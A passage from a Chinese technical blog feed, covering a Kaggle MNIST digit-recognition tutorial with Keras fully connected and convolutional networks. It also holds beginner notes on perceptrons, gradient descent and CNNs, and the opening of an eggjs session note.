<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/kaggle/input/digit-recognizer/train.csv</span><br><span class="line">/kaggle/input/digit-recognizer/test.csv</span><br><span class="line">/kaggle/input/digit-recognizer/sample_submission.csv</span><br></pre></td></tr></table></figure>

<p>读取数据自然是用pandas的read_csv函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_data = pd.read_csv(<span class="string">&#x27;/kaggle/input/digit-recognizer/train.csv&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(train_data)</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">       label  pixel0  pixel1  pixel2  pixel3  pixel4  pixel5  pixel6  pixel7  \</span><br><span class="line">0          1       0       0       0       0       0       0       0       0</span><br><span class="line">1          0       0       0       0       0       0       0       0       0</span><br><span class="line">2          1       0       0       0       0       0       0       0       0</span><br><span class="line">3          4       0       0       0       0       0       0       0       0</span><br><span class="line">4          0       0       0       0       0       0       0       0       0</span><br><span class="line">...      ...     ...     ...     ...     ...     ...     ...     ...     ...</span><br><span class="line">41995      0       0       0       0       0       0       0       0       0</span><br><span class="line">41996      1       0       0       0       0       0       0       0       0</span><br><span class="line">41997      7       0       0       0       0       0       0       0       0</span><br><span class="line">41998      6       0       0       0       0       0       0       0       0</span><br><span class="line">41999      9       0       0       0       0       0       0       0       0</span><br><span class="line"></span><br><span class="line">       pixel8  ...  pixel774  pixel775  pixel776  pixel777  pixel778  \</span><br><span class="line">0           0  ...         0         0         0         0         0</span><br><span class="line">1           0  ...         0         0         0         0         0</span><br><span class="line">2           0  ...         0         0         0         0         0</span><br><span class="line">3           0  ...         0         0         0         0         0</span><br><span class="line">4           0  ...         0         0         0         0         0</span><br><span class="line">...       ...  ...       ...       ...       ...       ...       ...</span><br><span class="line">41995       0  ...         0         0         0         0         0</span><br><span class="line">41996       0  ...         0         0         0         0         0</span><br><span class="line">41997       0  ...         0         0         0         0         0</span><br><span class="line">41998       0  ...         0         0         0         0         0</span><br><span class="line">41999       0  ...         0         0         0         0         0</span><br><span class="line"></span><br><span class="line">       pixel779  pixel780  pixel781  pixel782  pixel783</span><br><span class="line">0             0         0         0         0         0</span><br><span class="line">1             0         0         0         0         0</span><br><span class="line">2             0         0         0         0         0</span><br><span class="line">3             0         0         0         0         0</span><br><span class="line">4             0         0         0         0         0</span><br><span class="line">...         ...       ...       ...       ...       ...</span><br><span class="line">41995         0         0         0         0         0</span><br><span class="line">41996         0         0         0         0         0</span><br><span class="line">41997         0         0         0         0         0</span><br><span class="line">41998         0         0         0         0         0</span><br><span class="line">41999         0         0         0         0         0</span><br><span class="line"></span><br><span class="line">[42000 rows x 785 columns]</span><br></pre></td></tr></table></figure>

<p>取出label，也就是标记，并做一下统计，用sns的countplot画一下统计图</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line">Y_train = train_data[<span class="string">&#x27;label&#x27;</span>]</span><br><span class="line">sns.countplot(Y_train)</span><br><span class="line">Y_train.value_counts()</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1    4684</span><br><span class="line">7    4401</span><br><span class="line">3    4351</span><br><span class="line">9    4188</span><br><span class="line">2    4177</span><br><span class="line">6    4137</span><br><span class="line">0    4132</span><br><span class="line">4    4072</span><br><span class="line">8    4063</span><br><span class="line">5    3795</span><br><span class="line">Name: label, dtype: int64</span><br></pre></td></tr></table></figure>
<img src="2020-05-16-01.png">

<p>取数据部分，就是把数据裁掉label列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">X_train = train_data.drop(labels=[<span class="string">&#x27;label&#x27;</span>], axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(X_train)</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">       pixel0  pixel1  pixel2  pixel3  pixel4  pixel5  pixel6  pixel7  pixel8  \</span><br><span class="line">0           0       0       0       0       0       0       0       0       0</span><br><span class="line">1           0       0       0       0       0       0       0       0       0</span><br><span class="line">2           0       0       0       0       0       0       0       0       0</span><br><span class="line">3           0       0       0       0       0       0       0       0       0</span><br><span class="line">4           0       0       0       0       0       0       0       0       0</span><br><span class="line">...       ...     ...     ...     ...     ...     ...     ...     ...     ...</span><br><span class="line">41995       0       0       0       0       0       0       0       0       0</span><br><span class="line">41996       0       0       0       0       0       0       0       0       0</span><br><span class="line">41997       0       0       0       0       0       0       0       0       0</span><br><span class="line">41998       0       0       0       0       0       0       0       0       0</span><br><span class="line">41999       0       0       0       0       0       0       0       0       0</span><br><span class="line"></span><br><span class="line">       pixel9  ...  pixel774  pixel775  pixel776  pixel777  pixel778  \</span><br><span class="line">0           0  ...         0         0         0         0         0</span><br><span class="line">1           0  ...         0         0         0         0         0</span><br><span class="line">2           0  ...         0         0         0         0         0</span><br><span class="line">3           0  ...         0         0         0         0         0</span><br><span class="line">4           0  ...         0         0         0         0         0</span><br><span class="line">...       ...  ...       ...       ...       ...       ...       ...</span><br><span class="line">41995       0  ...         0         0         0         0         0</span><br><span class="line">41996       0  ...         0         0         0         0         0</span><br><span class="line">41997       0  ...         0         0         0         0         0</span><br><span class="line">41998       0  ...         0         0         0         0         0</span><br><span class="line">41999       0  ...         0         0         0         0         0</span><br><span class="line"></span><br><span class="line">       pixel779  pixel780  pixel781  pixel782  pixel783</span><br><span class="line">0             0         0         0         0         0</span><br><span class="line">1             0         0         0         0         0</span><br><span class="line">2             0         0         0         0         0</span><br><span class="line">3             0         0         0         0         0</span><br><span class="line">4             0         0         0         0         0</span><br><span class="line">...         ...       ...       ...       ...       ...</span><br><span class="line">41995         0         0         0         0         0</span><br><span class="line">41996         0         0         0         0         0</span><br><span class="line">41997         0         0         0         0         0</span><br><span class="line">41998         0         0         0         0         0</span><br><span class="line">41999         0         0         0         0         0</span><br><span class="line"></span><br><span class="line">[42000 rows x 784 columns]</span><br></pre></td></tr></table></figure>

<p>数据取出来了，删除原变量清理空间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> train_data</span><br></pre></td></tr></table></figure>

<p>处理label为训练需要的，由于输出为10个数字，所以转成[0, 1, …, 0]的形式，比较好输出<br>使用tensorflow的keras中的to_categorical函数进行转化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="built_in">print</span>(Y_train)</span><br><span class="line">Y_train = tf.keras.utils.to_categorical(Y_train, num_classes = <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(Y_train)</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0        1</span><br><span class="line">1        0</span><br><span class="line">2        1</span><br><span class="line">3        4</span><br><span class="line">4        0</span><br><span class="line">        ..</span><br><span class="line">41995    0</span><br><span class="line">41996    1</span><br><span class="line">41997    7</span><br><span class="line">41998    6</span><br><span class="line">41999    9</span><br><span class="line">Name: label, Length: 42000, dtype: int64</span><br><span class="line">[[0. 1. 0. ... 0. 0. 0.]</span><br><span class="line"> [1. 0. 0. ... 0. 0. 0.]</span><br><span class="line"> [0. 1. 0. ... 0. 0. 0.]</span><br><span class="line"> ...</span><br><span class="line"> [0. 0. 0. ... 1. 0. 0.]</span><br><span class="line"> [0. 0. 0. ... 0. 0. 0.]</span><br><span class="line"> [0. 0. 0. ... 0. 0. 1.]]</span><br></pre></td></tr></table></figure>

<h2 id="2-搭建神经网络"><a href="#2-搭建神经网络" class="headerlink" title="2. 搭建神经网络"></a>2. 搭建神经网络</h2><h3 id="1-1-全连接神经网络"><a href="#1-1-全连接神经网络" class="headerlink" title="1.1. 全连接神经网络"></a>1.1. <span id="full_connect">全连接神经网络</span></h3><p>第一步先用最简单的刚学会的全连接神经网络进行搭建<br>先初始化tpu</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># detect and init the TPU</span></span><br><span class="line">tpu = tf.distribute.cluster_resolver.TPUClusterResolver()</span><br><span class="line">tf.config.experimental_connect_to_cluster(tpu)</span><br><span class="line">tf.tpu.experimental.initialize_tpu_system(tpu)</span><br><span class="line"></span><br><span class="line"><span class="comment"># instantiate a distribution strategy</span></span><br><span class="line">tpu_strategy = tf.distribute.experimental.TPUStrategy(tpu)</span><br></pre></td></tr></table></figure>

<p>全连接神经网络使用tensorflow上层封装的keras很方便的搭建</p>
<ul>
<li>由于数据为784像素，搭建一个$784 \times 300 \times 10$的三层全连接神经网络</li>
<li>激活函数用sigmoid函数，输出层不使用激活函数</li>
<li>训练算法为随机梯度下降算法SDG</li>
<li>损失函数使用最常见的方差，也就是MSE函数</li>
<li>评估函数，就是每次训练给自己看的正确率，使用accuracy</li>
<li>没有让定学习率，是keras自定义了一个学习率，想改可以更改，仿照下面示例<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lr = tf.keras.get_value(model.optimizer.lr)</span><br><span class="line">tf.keras.set_value(model.optimizer.lr, lr * <span class="number">0.1</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>搭建神经网络</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用tpu进行编译</span></span><br><span class="line"><span class="keyword">with</span> tpu_strategy.scope():</span><br><span class="line">    model = tf.keras.Sequential([</span><br><span class="line">    <span class="comment"># Adds a densely-connected layer with 784 units to the model:</span></span><br><span class="line">    tf.keras.layers.Dense(<span class="number">784</span>, activation=<span class="string">&#x27;sigmoid&#x27;</span>, input_shape=(<span class="number">784</span>,)),</span><br><span class="line">    <span class="comment"># Add another:</span></span><br><span class="line">    tf.keras.layers.Dense(<span class="number">300</span>, activation=<span class="string">&#x27;sigmoid&#x27;</span>),</span><br><span class="line">    <span class="comment"># Add an output layer with 10 output units:</span></span><br><span class="line">    tf.keras.layers.Dense(<span class="number">10</span>)])</span><br><span class="line"></span><br><span class="line">    model.<span class="built_in">compile</span>(optimizer=<span class="string">&#x27;sgd&#x27;</span>,</span><br><span class="line">                  loss=<span class="string">&#x27;mse&#x27;</span>,</span><br><span class="line">                  metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>开始训练，训练10轮，不使用batch_size，也就是一个数据训练一次，使用就是多少个数据一起计算损失进行训练<br>上面的评价函数应该用accuracy，不过我写成了mse，和loss一样了，不过可以看出损失在下降</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model.fit(X_train, Y_train, epochs=<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Train on 42000 samples</span><br><span class="line">Epoch 1/10</span><br><span class="line">42000/42000 [==============================] - 19s 445us/sample - loss: 0.0662 - mse: 0.0662</span><br><span class="line">Epoch 2/10</span><br><span class="line">42000/42000 [==============================] - 15s 358us/sample - loss: 0.0450 - mse: 0.0450</span><br><span class="line">Epoch 3/10</span><br><span class="line">42000/42000 [==============================] - 15s 363us/sample - loss: 0.0389 - mse: 0.0389</span><br><span class="line">Epoch 4/10</span><br><span class="line">42000/42000 [==============================] - 15s 361us/sample - loss: 0.0352 - mse: 0.0352</span><br><span class="line">Epoch 5/10</span><br><span class="line">42000/42000 [==============================] - 15s 368us/sample - loss: 0.0327 - mse: 0.0327</span><br><span class="line">Epoch 6/10</span><br><span class="line">42000/42000 [==============================] - 15s 365us/sample - loss: 0.0307 - mse: 0.0307</span><br><span class="line">Epoch 7/10</span><br><span class="line">42000/42000 [==============================] - 15s 360us/sample - loss: 0.0290 - mse: 0.0290</span><br><span class="line">Epoch 8/10</span><br><span class="line">42000/42000 [==============================] - 15s 361us/sample - loss: 0.0277 - mse: 0.0277</span><br><span class="line">Epoch 9/10</span><br><span class="line">42000/42000 [==============================] - 16s 382us/sample - loss: 0.0265 - mse: 0.0265</span><br><span class="line">Epoch 10/10</span><br><span class="line">42000/42000 [==============================] - 15s 360us/sample - loss: 0.0255 - mse: 0.0255</span><br></pre></td></tr></table></figure>

<p>预测正确率为91.085%，很开心，初步使用神经网络完成</p>
<p><strong>几个参数修改对比</strong></p>
<ul>
<li>输出层加上sigmoid激活函数，正确率降低到81.285%，猜测限制了发挥</li>
<li>输出层使用relu函数，正确率比sigmoid函数高一点，到达85.014%，应该同样限制了发挥吧</li>
<li>所有层使用relu函数，预测结果直接有问题，relu函数导致结果全部为0，所以无法正常训练<ul>
<li>根据网上查到的信息，主要原因是输入没有做归一化，权值初始化有问题，训练过程出现权值过大或者过小，通过relu函数变成0，训练过程权值无法调整到合适的值导致无法正常训练</li>
</ul>
</li>
<li>隐藏层改为100个神经元，预测结果和300差别不大，都是91.000%</li>
<li>神经网络改为$784 \times 150 \times 150 \times 10$，正确率达到86.257%，暂时未测试是否是训练轮数不够导致影响<ul>
<li>sigmoid函数作为激活函数，在反向传播算法中，传播越远，梯度下降越难。由于传播使用的前一层的导数乘积，sigmoid函数导数最大为$\frac{1}{4}$，所以会下降更难，一般全连接神经网络只有三层</li>
</ul>
</li>
</ul>
<h3 id="1-2-卷积神经网络"><a href="#1-2-卷积神经网络" class="headerlink" title="1.2. 卷积神经网络"></a>1.2. <span id="convolution_connect">卷积神经网络</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用tpu进行编译</span></span><br><span class="line"><span class="keyword">with</span> tpu_strategy.scope():</span><br><span class="line">    <span class="comment"># Set the CNN model</span></span><br><span class="line">    <span class="comment"># my CNN architechture is In -&gt; [[Conv2D-&gt;relu]*2 -&gt; MaxPool2D -&gt; Dropout]*2 -&gt; Flatten -&gt; Dense -&gt; Dropout -&gt; Out</span></span><br><span class="line">    model = tf.keras.Sequential()</span><br><span class="line">    model.add(tf.keras.layers.Conv2D(filters = <span class="number">32</span>, kernel_size = (<span class="number">5</span>,<span class="number">5</span>),padding = <span class="string">&#x27;Same&#x27;</span>,</span><br><span class="line">                     activation =<span class="string">&#x27;relu&#x27;</span>, input_shape = (<span class="number">28</span>,<span class="number">28</span>,<span class="number">1</span>)))</span><br><span class="line">    model.add(tf.keras.layers.Conv2D(filters = <span class="number">32</span>, kernel_size = (<span class="number">5</span>,<span class="number">5</span>),padding = <span class="string">&#x27;Same&#x27;</span>,</span><br><span class="line">                     activation =<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(tf.keras.layers.MaxPool2D(pool_size=(<span class="number">2</span>,<span class="number">2</span>)))</span><br><span class="line">    model.add(tf.keras.layers.Dropout(<span class="number">0.25</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    model.add(tf.keras.layers.Conv2D(filters = <span class="number">64</span>, kernel_size = (<span class="number">3</span>,<span class="number">3</span>),padding = <span class="string">&#x27;Same&#x27;</span>,</span><br><span class="line">                     activation =<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(tf.keras.layers.Conv2D(filters = <span class="number">64</span>, kernel_size = (<span class="number">3</span>,<span class="number">3</span>),padding = <span class="string">&#x27;Same&#x27;</span>,</span><br><span class="line">                     activation =<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(tf.keras.layers.MaxPool2D(pool_size=(<span class="number">2</span>,<span class="number">2</span>), strides=(<span class="number">2</span>,<span class="number">2</span>)))</span><br><span class="line">    model.add(tf.keras.layers.Dropout(<span class="number">0.25</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    model.add(tf.keras.layers.Flatten())</span><br><span class="line">    model.add(tf.keras.layers.Dense(<span class="number">256</span>, activation = <span class="string">&quot;relu&quot;</span>))</span><br><span class="line">    model.add(tf.keras.layers.Dropout(<span class="number">0.5</span>))</span><br><span class="line">    model.add(tf.keras.layers.Dense(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Define the optimizer</span></span><br><span class="line">    optimizer = tf.keras.optimizers.RMSprop(lr=<span class="number">0.001</span>, rho=<span class="number">0.9</span>, epsilon=<span class="number">1e-08</span>, decay=<span class="number">0.0</span>)</span><br><span class="line">    <span class="comment"># Compile the model</span></span><br><span class="line">    model.<span class="built_in">compile</span>(optimizer = optimizer , loss = <span class="string">&quot;mse&quot;</span>, metrics=[<span class="string">&quot;accuracy&quot;</span>])</span><br><span class="line"></span><br><span class="line">    model.fit(X_train, Y_train, epochs=<span class="number">9</span>, batch_size=<span class="number">42</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Train on 42000 samples</span><br><span class="line">Epoch 1/9</span><br><span class="line">42000/42000 [==============================] - 9s 225us/sample - loss: 0.6169 - accuracy: 0.8257</span><br><span class="line">Epoch 2/9</span><br><span class="line">42000/42000 [==============================] - 5s 126us/sample - loss: 0.0145 - accuracy: 0.9686</span><br><span class="line">Epoch 3/9</span><br><span class="line">42000/42000 [==============================] - 5s 131us/sample - loss: 0.0123 - accuracy: 0.9736</span><br><span class="line">Epoch 4/9</span><br><span class="line">42000/42000 [==============================] - 5s 126us/sample - loss: 0.0113 - accuracy: 0.9763</span><br><span class="line">Epoch 5/9</span><br><span class="line">42000/42000 [==============================] - 5s 125us/sample - loss: 0.0110 - accuracy: 0.9772</span><br><span class="line">Epoch 6/9</span><br><span class="line">42000/42000 [==============================] - 6s 132us/sample - loss: 0.0107 - accuracy: 0.9774</span><br><span class="line">Epoch 7/9</span><br><span class="line">42000/42000 [==============================] - 6s 135us/sample - loss: 0.0105 - accuracy: 0.9775</span><br><span class="line">Epoch 8/9</span><br><span class="line">42000/42000 [==============================] - 6s 132us/sample - loss: 0.0102 - accuracy: 0.9787</span><br><span class="line">Epoch 9/9</span><br><span class="line">42000/42000 [==============================] - 5s 125us/sample - loss: 0.0102 - accuracy: 0.9774</span><br></pre></td></tr></table></figure>

<h2 id="3-结果预测"><a href="#3-结果预测" class="headerlink" title="3. 结果预测"></a>3. 结果预测</h2><ul>
<li>对测试数据进行读取和预测</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">X_test = pd.read_csv(<span class="string">&#x27;/kaggle/input/digit-recognizer/test.csv&#x27;</span>)</span><br><span class="line">X_test = X_test.values.reshape(-<span class="number">1</span>,<span class="number">28</span>,<span class="number">28</span>,<span class="number">1</span>)</span><br><span class="line">result = model.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[-6.0319379e-03  2.2311732e-03  9.7684860e-01 ... -5.4722652e-03</span><br><span class="line">   5.9211254e-04  4.1266829e-03]</span><br><span class="line"> [ 1.0062367e+00 -2.2030249e-03 -5.0238818e-03 ... -3.2700002e-03</span><br><span class="line">  -9.3276799e-04 -3.5367012e-03]</span><br><span class="line"> [ 2.6999190e-03  6.4259917e-03  1.0489762e-02 ... -1.1652485e-03</span><br><span class="line">   6.1268814e-02  9.1225845e-01]</span><br><span class="line"> ...</span><br><span class="line"> [-5.9012100e-03 -9.0321898e-04  1.8455610e-03 ...  2.4292246e-03</span><br><span class="line">  -3.2179952e-03 -1.5886426e-03]</span><br><span class="line"> [-7.6884702e-03 -5.6109652e-03 -2.5104508e-03 ... -7.8360438e-03</span><br><span class="line">  -1.0629505e-02  1.0693249e+00]</span><br><span class="line"> [-2.6000291e-03  5.1201209e-03  9.4756949e-01 ... -3.5209060e-03</span><br><span class="line">   5.4134727e-03  6.2924922e-03]]</span><br></pre></td></tr></table></figure>

<ul>
<li>这数据肯定不能用，用argmax转成我们需要的结果</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tmp =  np.argmax(result, axis=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2 0 9 ... 3 9 2]</span><br></pre></td></tr></table></figure>

<ul>
<li>存到csv，提交</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result_data = pd.read_csv(<span class="string">&#x27;/kaggle/input/digit-recognizer/sample_submission.csv&#x27;</span>)</span><br><span class="line">result_data[<span class="string">&#x27;Label&#x27;</span>] = tmp</span><br><span class="line">result_data.to_csv(<span class="string">&#x27;/kaggle/working/sample_submission.csv&#x27;</span>, index = <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>AI</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>零基础入门深度学习笔记</title>
    <url>/blogs/2020-05-11-deepLearning/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul>
<li>此博客为学习<a href="https://www.zybuluo.com/hanbingtao/note/433855">零基础入门深度学习</a>所记的笔记，有一些自己的思考</li>
<li>代码位置（原博客使用python2实现，这里使用python3实现）: <a href="https://github.com/Githubwyb/DeepLearningStudy">github</a></li>
</ul>
<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-名词解释"><a href="#1-名词解释" class="headerlink" title="1. 名词解释"></a>1. 名词解释</h2><ul>
<li>激活函数，神经元接收外部参数后通过加权和或者其他算法，处理最后结果的函数，常见的有sigmoid和relu等</li>
<li>FNN，前馈神经网络（全连接神经网络）</li>
</ul>
<h2 id="2-几种激活函数"><a href="#2-几种激活函数" class="headerlink" title="2. 几种激活函数"></a>2. 几种激活函数</h2><h3 id="sigmoid函数"><a href="#sigmoid函数" class="headerlink" title="sigmoid函数"></a>sigmoid函数</h3><img src="2020_05_22_01.jpg" />

<p>$$<br>sigmoid(x) &#x3D; \frac{1}{1 + e^x}<br>$$</p>
<ul>
<li>全连接神经网络最常见的激活函数一般为sigmoid函数，它的特性是导数和函数本身一样</li>
<li>一般不用于较深的神经网络，由于反向传播算法越深训练难度越大，梯度下降更小</li>
</ul>
<h3 id="relu函数"><a href="#relu函数" class="headerlink" title="relu函数"></a>relu函数</h3><img src="2020_05_22_02.png" />

<p>一般用于卷积神经网络，可用于训练较深的神经网络，其在反向传播算法中梯度下降稳定</p>
<h1 id="二、感知器"><a href="#二、感知器" class="headerlink" title="二、感知器"></a>二、感知器</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><img src="2020_05_11_01.png" />

<ul>
<li>很简单，就是一个神经元。神经元接收外部输入，输出数据。</li>
<li>一般预测就是真或者假，所以一般输出为0或者1</li>
<li>外部输入就是外部环境，可能有多个数（生活数据化），内部处理就是最简单的加权和: $w_1x_1 + w_2x_2 + … + w_nx_n$</li>
<li>想要输出为0或者1，只通过加权和一般得不到，但是呢，人总是想大于某个值为1，小于为0。转化一下就是激活函数:</li>
</ul>
<p>$$<br>f(x) &#x3D; \left\{\begin{array}{ll}<br>    1 &amp; {x &gt; 0} \\<br>    0 &amp; otherwise<br>\end{array}\right<br>$$</p>
<h2 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h2><ul>
<li>最简单的数学，达不到目标，差值乘以输入，整体乘一个系数防止过拟合</li>
</ul>
<p>$$<br>\begin{aligned}<br>    w_i &amp; &#x3D; w_i + \eta (result - predict)x_i \\<br>    b_i &amp; &#x3D; b_i + \eta (result - predict)<br>\end{aligned}<br>$$</p>
<h2 id="自己想法"><a href="#自己想法" class="headerlink" title="自己想法"></a>自己想法</h2><ul>
<li>$w_i x_i$其实就是一条直线，二维比较好想，就是二元一次函数。在直线上就是<code>ax + by + c &gt; 0</code></li>
<li>感知器其实就是在无数个点中找到一条直线，在0和1的判断中就是将点分开在两侧</li>
<li>如果是$f(x) &#x3D; x$的激活函数，就是尽可能让所有点到直线距离最短（回归函数）</li>
</ul>
<h1 id="三、梯度下降算法"><a href="#三、梯度下降算法" class="headerlink" title="三、梯度下降算法"></a>三、梯度下降算法</h1><h2 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h2><p>主要是讲如何训练感知器，知道感知器不知道怎么训练可不行。</p>
<ol>
<li>算法原理很容易解释，想要达到期望值，需要使<code>result - predict</code>尽可能的小，然而有正有负，就取个平方$(result - predict)^2$。</li>
<li>尽可能小就是让它在每次训练不断下降，也就是变量要向减小的方向走。导数就代表函数运行方向，所以求导，让当前值减去导数。</li>
<li>当然不能直接减，要柔和的下降，防止跑远了（说人话，乘以一个系数，也就是训练力度）。经过各种计算到最后，得到和上面训练函数完全一样。</li>
</ol>
<p>$$<br>\begin{aligned}<br>    w_i &amp; &#x3D; w_i + \eta (result - predict)x_i \\<br>    b_i &amp; &#x3D; b_i + \eta (result - predict)<br>\end{aligned}<br>$$</p>
<h2 id="BGD和SGD"><a href="#BGD和SGD" class="headerlink" title="BGD和SGD"></a>BGD和SGD</h2><ul>
<li>我们进行训练时需要用到损失，如果一个数据算一次损失进行训练，叫做随机梯度下降SGD</li>
<li>如果算一批数据进行训练，叫做批梯度下降BGD</li>
</ul>
<h1 id="四、神经网络"><a href="#四、神经网络" class="headerlink" title="四、神经网络"></a>四、神经网络</h1><h2 id="1-描述"><a href="#1-描述" class="headerlink" title="1. 描述"></a>1. 描述</h2><img src="2020_05_11_02.jpeg" />

<ol>
<li>神经网络就是多了神经元相互连接形成的一个网络</li>
<li>输入层有几个输入就有几个神经元</li>
<li>输出层有几个输出就有几个神经元</li>
<li>隐藏层则是自己定有几层有几个神经元</li>
<li>算法先用梯度下降算法进行推导，之前推导过，各种求偏导，从输出层开始向前训练，所以又叫<strong>反向传播算法</strong>，公式就不列了</li>
<li>实现就比较复杂了，我们了解其中的原理就好了，毕竟不同的激活函数就对应不同的算法</li>
<li>使用tensorflow可以帮你写好各种训练函数，只需要配置就好，<a href="/blogs/2020-05-12-minst/#full_connect">这里是使用全连接神经网络计算minst手写数据集的实例</a></li>
</ol>
<h2 id="2-训练公式"><a href="#2-训练公式" class="headerlink" title="2. 训练公式"></a>2. 训练公式</h2><p><strong>权重训练公式</strong></p>
<p>$$<br>w_{ji} \leftarrow w_{ji} + \eta\delta_{j}x_{ji}<br>$$</p>
<ul>
<li>$\eta$ 为学习速率</li>
<li>$\delta$ 为偏差</li>
</ul>
<p><strong>对于输出层</strong></p>
<p>$$<br>\delta_i &#x3D; y_i(1 - y_i)(t - y_i)<br>$$</p>
<ul>
<li>$y_i(1 - y_i)$ 为sigmoid函数的导数</li>
</ul>
<p><strong>对于隐藏层</strong></p>
<p>$$<br>\delta_i &#x3D; a_i(1 - a_i)\sum_{k \in outputs}w_{ki}\delta_k<br>$$</p>
<ul>
<li>$a_i$ 为当前节点的输出值</li>
<li>通俗讲，下一级的偏差加权和就是当前的输出和期望的差值</li>
</ul>
<h1 id="五、卷积神经网络"><a href="#五、卷积神经网络" class="headerlink" title="五、卷积神经网络"></a>五、卷积神经网络</h1><img src="2021_11_02_01.png" />

<ul>
<li>卷积神经网络更多是处理图像</li>
</ul>
<h2 id="1-全连接网络处理图像的局限"><a href="#1-全连接网络处理图像的局限" class="headerlink" title="1. 全连接网络处理图像的局限"></a>1. 全连接网络处理图像的局限</h2><ul>
<li>参数太多，一个图片的像素点做全连接，对于高清图片，参数指数级增长</li>
<li>没有利用图像各个像素之间的位置关系</li>
<li>层数限制，无法表达更多的信息，一般很难使用超过3层的网络</li>
</ul>
<h2 id="2-卷积网络的优势"><a href="#2-卷积网络的优势" class="headerlink" title="2. 卷积网络的优势"></a>2. 卷积网络的优势</h2><ul>
<li>局部连接，卷积使得每个神经元仅和一部分神经元连接，减少很多参数</li>
<li>一组连接共享一个权重，减少参数</li>
<li>下采样 可以使用Pooling来减少每层的样本数，进一步减少参数数量，同时还可以提升模型的鲁棒性。</li>
</ul>
<h2 id="3-描述"><a href="#3-描述" class="headerlink" title="3. 描述"></a>3. 描述</h2><ul>
<li>卷积神经网络可以由若干卷积层、pooling层、全连接层组成，常用架构<br><code>INPUT -&gt; (CONV * N -&gt; POOL?) * M -&gt; FC * K</code></li>
<li>每层神经元排列是三位结构，长度宽度对应图片的长宽，高度对应不同filter，每个filter会生成一个Feature Map</li>
<li>每一层对应几个filter是一个超参数，每个filter对应一个特征</li>
<li>POOL层是对Feature Map做下采样得到更小的Feature Map</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>图像使用卷积神经网络效果更好</li>
<li>语言补充使用长短时记忆神经网络更好</li>
<li>语义分析就需要使用递归神经网络来处理</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
      <tags>
        <tag>AI</tag>
      </tags>
  </entry>
  <entry>
    <title>eggjs笔记</title>
    <url>/blogs/2020-04-23-eggjs/</url>
    <content><![CDATA[<h1 id="一、知识"><a href="#一、知识" class="headerlink" title="一、知识"></a>一、知识</h1><h2 id="1-session机制"><a href="#1-session机制" class="headerlink" title="1. session机制"></a>1. session机制</h2><p>eggjs内置session机制，可设置超时时间等。在超时时间内，session内保存的信息均可以通过同一个cookie获得。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">ctx</span>.<span class="property">session</span>.<span class="property">user_info</span> = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">10</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>配置超时时间等信息，在<code>/config/config.default.js</code>中添加以下代码</p>
